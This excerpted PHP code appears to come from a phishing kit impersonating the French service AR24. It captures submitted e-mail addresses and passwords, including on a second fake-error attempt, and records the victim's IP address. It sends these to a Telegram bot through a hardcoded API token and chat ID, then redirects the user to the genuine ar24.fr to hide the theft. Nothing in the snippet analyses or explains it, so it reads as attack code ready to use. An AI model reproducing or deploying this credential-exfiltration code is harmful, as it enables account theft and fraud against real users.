...
function telegram_send($message) {
    $curl = curl_init();
    $api_key  = '7925429980:AAGiALWhhzMB6s_I_xAfT8kdDUjtKnFo-MA';
    $chat_id  = '8191232412';
    $format   = 'HTML';
...
if($_SERVER['REQUEST_METHOD'] == "POST") {
    ...
    if (isset($_POST["email"])) {
        ...
        $_SESSION['password'] = $_POST['password'];
            ...
            $telegram_message = '    ✔️ AR24 ' . $_SERVER[''] . "\r\n";
    ...
    if (isset($_POST["email1"])) {
        ...
        $_SESSION['password1'] = $_POST['password1'];
            ...
            $telegram_message = '    ✔️ AR24-Erreur ' . $_SERVER[''] . "\r\n";
            $telegram_message .= '' . $_POST[''] . "\r\n";
		...
		$telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
            ...
            header("Location: https://www.ar24.fr/");
}
